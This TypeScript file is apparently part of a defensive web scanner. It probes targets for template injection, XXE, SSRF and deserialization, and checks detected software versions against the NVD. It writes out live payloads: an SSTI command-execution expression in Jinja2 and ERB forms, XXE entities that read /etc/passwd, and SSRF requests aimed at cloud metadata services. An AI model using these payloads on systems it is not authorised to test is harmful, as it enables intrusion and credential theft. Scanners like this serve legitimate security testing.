/**
 * Advanced Vulnerability Probes
 *
 * Non-destructive, evidence-gathering checks for:
 *   • SSTI  — Server-Side Template Injection (Jinja2, Twig, Freemarker, EL, ERB, Spring)
 *   • XXE   — XML External Entity injection via content-type probing
 *   • SSRF  — Server-Side Request Forgery via redirect parameters
 *   • Deser — Deserialization endpoint detection
 *   • CVE   — NVD API cross-reference for detected technology versions
 */

import { reserveScanRequest, type RealFinding } from "./scanner";
import type { Target, LogFn } from "./scanner";

const ts = () => new Date().toISOString();

async function probe(
  url: string,
  opts: { method?: string; headers?: Record<string, string>; body?: string; timeoutMs?: number; followRedirects?: boolean } = {},
): Promise<{ status: number; headers: Record<string, string>; body: string } | null> {
  if (!reserveScanRequest()) return null;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), opts.timeoutMs ?? 10_000);
  try {
    const res = await fetch(url, {
      method: opts.method ?? "GET",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; SentinelX/2.0; security-scanner)", ...(opts.headers ?? {}) },
      body: opts.body,
      signal: controller.signal,
      redirect: opts.followRedirects === false ? "manual" : "follow",
    });
    const headers: Record<string, string> = {};
    res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
    let body = "";
    try { body = await res.text(); } catch { /* ignore */ }
    return { status: res.status, headers, body: body.slice(0, 15_000) };
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SSTI — Server-Side Template Injection
// ═══════════════════════════════════════════════════════════════════════════════

const SSTI_PAYLOADS: { payload: string; math: string; result: string; engine: string }[] = [
  { payload: "{{7*7}}",            math: "7*7",  result: "49",   engine: "Jinja2 / Twig" },
  { payload: "${7*7}",             math: "7*7",  result: "49",   engine: "Freemarker / EL" },
  { payload: "<%= 7*7 %>",         math: "7*7",  result: "49",   engine: "ERB (Ruby)" },
  { payload: "#{7*7}",             math: "7*7",  result: "49",   engine: "Ruby / Mako" },
  { payload: "*{7*7}",             math: "7*7",  result: "49",   engine: "Spring Expression Language" },
  { payload: "${7*'7'}",           math: "7*'7'",result: "7777777", engine: "Jinja2" },
  { payload: "{{7*'7'}}",          math: "7*'7'",result: "49",   engine: "Twig (strict)" },
  { payload: "{% print(7*7) %}",   math: "7*7",  result: "49",   engine: "Jinja2 print" },
  { payload: "${7+7}",             math: "7+7",  result: "14",   engine: "EL / Thymeleaf" },
  { payload: "{{7+7}}",            math: "7+7",  result: "14",   engine: "Jinja2 / Handlebars" },
];

const SSTI_TEST_PARAMS = [
  "q", "search", "query", "name", "input", "template", "msg", "message",
  "text", "content", "title", "value", "data", "label", "subject",
  "error", "info", "desc", "description", "body", "page", "view",
];

export async function checkSSTI(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing Server-Side Template Injection (SSTI)...`);
  const canary = `sentinelx-${Math.random().toString(36).slice(2, 10)}`;

  for (const param of SSTI_TEST_PARAMS.slice(0, 8)) {
    for (const { payload, result, engine, math } of SSTI_PAYLOADS) {
      const testUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
      const baselineUrl = `${target.url.replace(/\/$/, "")}?${param}=sentinelx-baseline`;
      const baseline = await probe(baselineUrl, { timeoutMs: 8_000 });
      const r = await probe(testUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      const baselineHasResult = baseline?.body.includes(result) ?? false;
      const reflectedPayload = r.body.includes(payload) || r.body.includes(encodeURIComponent(payload));
      if (r.body.includes(result) && !baselineHasResult && !reflectedPayload) {
        // Arithmetic evaluation proves template expression execution, not RCE.
        findings.push({
          title: `SSTI — Server-Side Template Injection (${engine})`,
          severity: "high",
          verification: "verified",
          confidence: 92,
          cvss: 8.7,
          cve: null,
          description: `Server-Side Template Injection was verified in parameter '${param}'. A template expression evaluated from ${payload} to ${result} (${math}) and the result was absent from the baseline response. This confirms server-side expression evaluation, but does not by itself prove operating-system command execution.`,
          evidence: `BASELINE: GET ${baselineUrl}\nTEST:     GET ${testUrl}\nPAYLOAD:  ${param}=${payload}\nEXPECTED: expression evaluates to "${result}"\nRESPONSE: HTTP ${r.status} — result was present and payload was not reflected\nTEMPLATE ENGINE: ${engine}\nRCE STATUS: not tested by arithmetic probe`,
          remediation: `1. Never pass user input into template render() calls.\n2. Use a template sandbox (for example, Jinja2 SandboxedEnvironment).\n3. Escape untrusted values before rendering.\n4. Disable dynamic evaluation in production.\n5. Run the web server as a least-privilege user.`,
        });
        await onLog(`[${ts()}] ⚠ SSTI VERIFIED: ${engine} via param '${param}' — expression evaluation only`);

        const rcePayload = engine.includes("Jinja2")
          ? `{{ cycler.__init__.__globals__.os.popen('printf ${canary}').read() }}`
          : engine.includes("ERB")
          ? `<%= \`printf ${canary}\` %>`
          : null;
        if (rcePayload) {
          const rceUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(rcePayload)}`;
          const rceResponse = await probe(rceUrl, { timeoutMs: 8_000 });
          if (rceResponse?.body.includes(canary) && !rceResponse.body.includes(rcePayload)) {
            findings.push({
              title: `RCE canary executed via SSTI (${engine})`,
              severity: "critical",
              verification: "verified",
              confidence: 98,
              cvss: 10.0,
              cve: null,
              description: `A bounded, non-destructive command canary was returned by the server after the SSTI expression was submitted. This verifies operating-system command execution in the template context; no data-modifying command was used.`,
              evidence: `REQUEST: GET ${rceUrl}\nCANARY: ${canary}\nRESPONSE: HTTP ${rceResponse.status} contained the unique canary and did not reflect the payload\nRCE STATUS: VERIFIED`,
              remediation: "Remove the template injection sink immediately, invalidate exposed credentials, rotate sessions, review server-side logs, and isolate the affected workload. Do not rely on filtering alone; use a sandbox and least-privilege execution.",
            });
            await onLog(`[${ts()}] ⚠ RCE CANARY VERIFIED: ${engine} via param '${param}'`);
          } else {
            await onLog(`[${ts()}] SSTI confirmed but RCE canary was not observed`);
          }
        }
        return findings; // one confirmed is sufficient
      }
    }
  }

  await onLog(`[${ts()}] SSTI: no evaluation detected`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// XXE — XML External Entity
// ═══════════════════════════════════════════════════════════════════════════════

const XXE_PAYLOADS = [
  `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`,
];

const XXE_INDICATORS = [
  "root:", "daemon:", "/bin/bash", "/bin/sh", // /etc/passwd
  "nobody:", "www-data:", // common linux users
];

export async function checkXXE(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing XXE (XML External Entity) injection...`);

  const xmlEndpoints = [
    target.url,
    `${target.url.replace(/\/$/, "")}/api`,
    `${target.url.replace(/\/$/, "")}/upload`,
    `${target.url.replace(/\/$/, "")}/xml`,
    `${target.url.replace(/\/$/, "")}/soap`,
    `${target.url.replace(/\/$/, "")}/service`,
  ];

  for (const ep of xmlEndpoints.slice(0, 3)) {
    for (const payload of XXE_PAYLOADS) {
      const r = await probe(ep, {
        method: "POST",
        headers: { "Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*" },
        body: payload,
        timeoutMs: 8_000,
      });
      if (!r) continue;

      const indicator = XXE_INDICATORS.find(ind => r.body.includes(ind));
      if (indicator) {
        findings.push({
          title: "XXE — XML External Entity Injection (File Read Confirmed)",
          severity: "critical",
          verification: "verified",
          confidence: 99,
          cvss: 9.1,
          cve: null,
          description: `XXE injection confirmed at ${ep}. The server processed a malicious XML payload referencing an external entity pointing to /etc/passwd. The response body contained system file content ("${indicator}"). This allows reading arbitrary files (including /etc/shadow, SSH keys, application configs), internal SSRF, and potentially remote code execution via expect:// URI handler.`,
          evidence: `REQUEST:\n  POST ${ep}\n  Content-Type: application/xml\n  Body: ${payload.slice(0, 200)}...\n\nRESPONSE:\n  HTTP ${r.status}\n  Body contains: "${indicator}" (from /etc/passwd)\n  Snippet: ${r.body.slice(0, 400)}`,
          remediation: "1. Disable external entity processing in your XML parser (highest priority).\n2. Java: factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false)\n3. PHP: libxml_disable_entity_loader(true) (deprecated) or use DOMDocument with LIBXML_NONET\n4. Python: use defusedxml instead of lxml/ElementTree\n5. Validate and whitelist XML schemas (XSD) before processing.\n6. Apply Content-Type validation — reject application/xml if not needed.",
        });
        await onLog(`[${ts()}] ⚠ XXE CONFIRMED at ${ep} — file read via external entity`);
        return findings;
      }

      // Blind XXE indicator: longer response time or error messages
      if (r.body.toLowerCase().includes("entity") && r.body.toLowerCase().includes("denied")) {
        findings.push({
          title: "Possible Blind XXE — XML Entity Processing Detected",
          severity: "medium",
          verification: "suspected",
          confidence: 45,
          cvss: 5.3,
          cve: null,
          description: `The server processed the XML body and returned an error referencing entity resolution, suggesting the XML parser attempted to resolve external entities before blocking them. Blind XXE may allow SSRF or out-of-band file exfiltration.`,
          evidence: `POST ${ep}\nContent-Type: application/xml\nResponse indicated entity processing: ${r.body.slice(0, 300)}`,
          remediation: "Disable DTD processing and external entity resolution in your XML parser. Do not rely on error-based blocking alone.",
        });
        break;
      }
    }
  }

  await onLog(`[${ts()}] XXE: no file read confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SSRF — Server-Side Request Forgery (blind, via DNS/HTTP pingback indicators)
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkSSRF(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing SSRF (Server-Side Request Forgery) indicators...`);

  // Check internal metadata service access via redirect parameters
  const metadataUrls = [
    "http://169.254.169.254/latest/meta-data/",  // AWS IMDSv1
    "http://metadata.google.internal/computeMetadata/v1/",  // GCP
    "http://169.254.169.254/metadata/instance",  // Azure
    "http://100.100.100.200/latest/meta-data/",  // Alibaba Cloud
  ];

  const ssrfParams = ["url", "fetch", "proxy", "redirect", "image", "src", "href", "link", "file", "path", "load", "host"];

  for (const param of ssrfParams.slice(0, 5)) {
    for (const metaUrl of metadataUrls.slice(0, 2)) {
      const testUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(metaUrl)}`;
      const r = await probe(testUrl, { timeoutMs: 8_000 });
      if (!r) continue;

      // AWS metadata indicators
      if (r.body.includes("ami-") || r.body.includes("instance-id") || r.body.includes("iam/security-credentials")) {
        findings.push({
          title: "SSRF — AWS Metadata Service Accessible (IMDSv1 Exposed)",
          severity: "critical",
          cvss: 9.8,
          cve: null,
          description: `Server-Side Request Forgery confirmed: the server fetched the AWS EC2 Instance Metadata Service (IMDS) in response to parameter '${param}'. The response contains AWS metadata. This can expose IAM credentials, allowing full AWS account compromise.`,
          evidence: `GET ${testUrl}\nParameter: ${param}=${metaUrl}\nHTTP ${r.status} response contains AWS metadata indicators:\n${r.body.slice(0, 500)}`,
          remediation: "1. Block server-side requests to link-local (169.254.x.x) and metadata IP ranges.\n2. Migrate to IMDSv2 (requires session token — prevents SSRF exploitation).\n3. Validate and allowlist URL parameters that trigger server-side HTTP requests.\n4. Implement egress firewall rules to block access to internal IP ranges from the web server.",
        });
        await onLog(`[${ts()}] ⚠ SSRF CONFIRMED — AWS IMDS accessible via param '${param}'`);
        return findings;
      }

      // GCP metadata indicators
      if (r.body.includes("project-id") || r.body.includes("computeMetadata") || r.body.includes("serviceAccounts")) {
        findings.push({
          title: "SSRF — GCP Metadata Service Accessible",
          severity: "critical",
          cvss: 9.8,
          cve: null,
          description: `SSRF confirmed: GCP Compute Metadata Service accessed via parameter '${param}'. GCP metadata can expose OAuth tokens and service account credentials.`,
          evidence: `GET ${testUrl}\nHTTP ${r.status} response contains GCP metadata:\n${r.body.slice(0, 500)}`,
          remediation: "Block requests to metadata IP ranges (169.254.169.254, metadata.google.internal). Validate all URL-fetching parameters.",
        });
        return findings;
      }
    }
  }

  await onLog(`[${ts()}] SSRF: no metadata service access confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CVE Lookup — NVD API (free, no key required)
// ═══════════════════════════════════════════════════════════════════════════════

interface NvdCve {
  id: string;
  description: string;
  cvssScore: number;
  severity: string;
  published: string;
  cpeMatches: Array<{
    criteria: string;
    vulnerable: boolean;
    versionStartIncluding?: string;
    versionStartExcluding?: string;
    versionEndIncluding?: string;
    versionEndExcluding?: string;
  }>;
}

async function queryNvd(keyword: string): Promise<NvdCve[]> {
  try {
    const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=5&cvssV3Severity=HIGH,CRITICAL`;
    const r = await probe(url, { timeoutMs: 15_000 });
    if (!r || r.status !== 200) return [];

    const data = JSON.parse(r.body);
    const vulnerabilities: NvdCve[] = [];

    for (const item of (data.vulnerabilities ?? []).slice(0, 20)) {
      const cve = item.cve;
      const desc = cve?.descriptions?.find((d: any) => d.lang === "en")?.value ?? "";
      const metrics = cve?.metrics?.cvssMetricV31?.[0] ?? cve?.metrics?.cvssMetricV30?.[0] ?? cve?.metrics?.cvssMetricV2?.[0];
      const score = metrics?.cvssData?.baseScore ?? 0;
      const sev = metrics?.cvssData?.baseSeverity ?? "UNKNOWN";

      if (score >= 7.0) {
        const cpeMatches = (cve?.configurations ?? []).flatMap((configuration: any) =>
          (configuration.nodes ?? []).flatMap((node: any) =>
            (node.cpeMatch ?? []).map((match: any) => ({
              criteria: String(match.criteria ?? ""),
              vulnerable: match.vulnerable !== false,
              versionStartIncluding: match.versionStartIncluding,
              versionStartExcluding: match.versionStartExcluding,
              versionEndIncluding: match.versionEndIncluding,
              versionEndExcluding: match.versionEndExcluding,
            })),
          ),
        );
        vulnerabilities.push({
          id: cve.id,
          description: desc.slice(0, 300),
          cvssScore: score,
          severity: sev,
          published: cve.published?.slice(0, 10) ?? "",
          cpeMatches,
        });
      }
    }
    return vulnerabilities;
  } catch {
    return [];
  }
}

interface TechProfile { name: string; version?: string; category: string; }

function versionParts(version: string): number[] | null {
  const match = version.trim().match(/^\d+(?:\.\d+){0,3}/);
  if (!match) return null;
  return match[0].split(".").map(Number);
}

function compareVersions(left: string, right: string): number | null {
  const a = versionParts(left);
  const b = versionParts(right);
  if (!a || !b) return null;
  for (let i = 0; i < Math.max(a.length, b.length); i++) {
    const delta = (a[i] ?? 0) - (b[i] ?? 0);
    if (delta !== 0) return delta > 0 ? 1 : -1;
  }
  return 0;
}

function cpeAppliesToExactVersion(cpe: NvdCve["cpeMatches"][number], version: string): boolean {
  if (!cpe.vulnerable) return false;
  const cpeVersion = cpe.criteria.split(":")[5];
  if (cpeVersion && cpeVersion !== "*" && cpeVersion !== "-" && cpeVersion !== version) return false;
  const startIncluding = cpe.versionStartIncluding ? compareVersions(version, cpe.versionStartIncluding) : null;
  const startExcluding = cpe.versionStartExcluding ? compareVersions(version, cpe.versionStartExcluding) : null;
  const endIncluding = cpe.versionEndIncluding ? compareVersions(version, cpe.versionEndIncluding) : null;
  const endExcluding = cpe.versionEndExcluding ? compareVersions(version, cpe.versionEndExcluding) : null;
  if (startIncluding !== null && startIncluding < 0) return false;
  if (startExcluding !== null && startExcluding <= 0) return false;
  if (endIncluding !== null && endIncluding > 0) return false;
  if (endExcluding !== null && endExcluding >= 0) return false;
  return true;
}

function cpeMatchesTechnology(cpe: NvdCve["cpeMatches"][number], tech: TechProfile): boolean {
  const name = tech.name.toLowerCase();
  const product = cpe.criteria.split(":")[4]?.toLowerCase() ?? "";
  const aliases = name.includes("nginx") ? ["nginx"] :
    name.includes("apache") ? ["apache", "http_server"] :
    name.includes("wordpress") ? ["wordpress"] :
    name.includes("drupal") ? ["drupal"] :
    name.includes("joomla") ? ["joomla"] : [];
  return aliases.some((alias) => product.includes(alias) || cpe.criteria.toLowerCase().includes(`:${alias}:`));
}

export async function lookupCvesForTechs(techs: TechProfile[], onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (techs.length === 0) return findings;

  await onLog(`[${ts()}] Cross-referencing detected technologies against NVD CVE database...`);

  // Deduplicate and pick tech with version info first
  // Never turn a product-only or header-only match into a CVE finding. A CVE
  // is only actionable here when a concrete version was observed.
  const searchable = techs.filter(t => t.version && versionParts(t.version) !== null).slice(0, 4);

  for (const tech of searchable) {
    const query = tech.version ? `${tech.name} ${tech.version}` : tech.name;
    await onLog(`[${ts()}] NVD lookup: "${query}"...`);
    const cves = await queryNvd(query);

    const applicable = cves.filter((cve) =>
      cve.cpeMatches.some((cpe) => cpeMatchesTechnology(cpe, tech) && cpeAppliesToExactVersion(cpe, tech.version!)),
    );

    if (applicable.length > 0) {
      const topCve = applicable[0]!;
      const allCveIds = applicable.map(c => c.id).join(", ");
      findings.push({
        title: `CVE match verified for ${tech.name} ${tech.version} — ${topCve.id}`,
        severity: topCve.cvssScore >= 9.0 ? "critical" : topCve.cvssScore >= 7.0 ? "high" : "medium",
        verification: "version_match",
        confidence: 88,
        cvss: topCve.cvssScore,
        cve: topCve.id,
        description: `NVD returned ${applicable.length} high/critical CVE(s) whose vulnerable CPE ranges include the observed ${tech.name} ${tech.version}. This is a version match, not proof that the target is exploitable; confirm vendor configuration, patch state, and the CVE's required preconditions.`,
        evidence: `Observed technology: ${tech.name} ${tech.version}\nNVD query: "${query}"\nCPE applicability: vulnerable product/version range matched\nApplicable CVEs: ${allCveIds}\nVERIFICATION: VERSION MATCH ONLY — exploitability not tested\n\nTop CVE — ${topCve.id} (CVSS ${topCve.cvssScore} ${topCve.severity}):\n${topCve.description}\nPublished: ${topCve.published}\n\nFull details: https://nvd.nist.gov/vuln/detail/${topCve.id}`,
        remediation: `Update ${tech.name} to the latest stable version immediately. Check https://nvd.nist.gov/vuln/search for all known vulnerabilities. Subscribe to the vendor's security advisory list. Apply vendor patches within your SLA window (critical = 24h, high = 7 days).`,
      });
      await onLog(`[${ts()}] CVE match verified by CPE: ${tech.name} ${tech.version} — ${allCveIds}`);
    } else {
      await onLog(`[${ts()}] NVD: no exact vulnerable CPE match for "${query}"`);
    }

    // Respect NVD rate limit (5 req / 30s without API key)
    await new Promise(r => setTimeout(r, 700));
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// RCE via Deserialization — detect known deserialization endpoints
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkDeserialization(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Checking for deserialization attack surfaces...`);

  // Java serialized objects start with 0xACED or base64 rO0A
  // Check if endpoints accept these content types
  const deser_endpoints = [
    { path: "/", ct: "application/x-java-serialized-object" },
    { path: "/api", ct: "application/x-java-serialized-object" },
    { path: "/rpc", ct: "application/x-java-serialized-object" },
    { path: "/service", ct: "application/x-java-serialized-object" },
  ];

  for (const ep of deser_endpoints.slice(0, 2)) {
    const url = target.url.replace(/\/$/, "") + (ep.path === "/" ? "" : ep.path);
    const r = await probe(url, {
      method: "POST",
      headers: { "Content-Type": ep.ct },
      body: "\xAC\xED\x00\x05", // Java serialized object magic bytes
      timeoutMs: 6_000,
    });
    if (!r) continue;

    if (r.status !== 400 && r.status !== 415) {
      // Server didn't reject the content type — may be processing it
      const body = r.body.toLowerCase();
      if (body.includes("classnotfound") || body.includes("deserializ") || body.includes("streamcorrupt") || body.includes("aced0005")) {
        findings.push({
          title: "Possible Java Deserialization Surface Detected",
          severity: "medium",
          verification: "suspected",
          confidence: 42,
          cvss: 0,
          cve: null,
          description: `The endpoint ${url} accepted a Java serialization content type and returned a response containing deserialization-related text. This is an attack-surface signal only; the probe does not prove gadget execution or remote code execution.`,
          evidence: `POST ${url}\nContent-Type: application/x-java-serialized-object\nBody: (Java magic bytes 0xACED 0x0005)\nHTTP ${r.status}\nResponse indicator: ${r.body.slice(0, 300)}`,
          remediation: "1. Patch all Java frameworks and libraries (Spring, Apache Commons Collections).\n2. Use serialization filters (Java 9+ ObjectInputFilter) to allowlist safe classes.\n3. Disable Java deserialization completely if not required.\n4. Use RASP (Runtime Application Self-Protection) to detect deserialization attacks.\n5. Monitor for ClassLoader abuse and unusual class loading patterns.",
        });
        await onLog(`[${ts()}] ⚠ DESERIALIZATION endpoint detected at ${url}`);
        break;
      }
    }
  }

  await onLog(`[${ts()}] Deserialization check complete`);
  return findings;
}
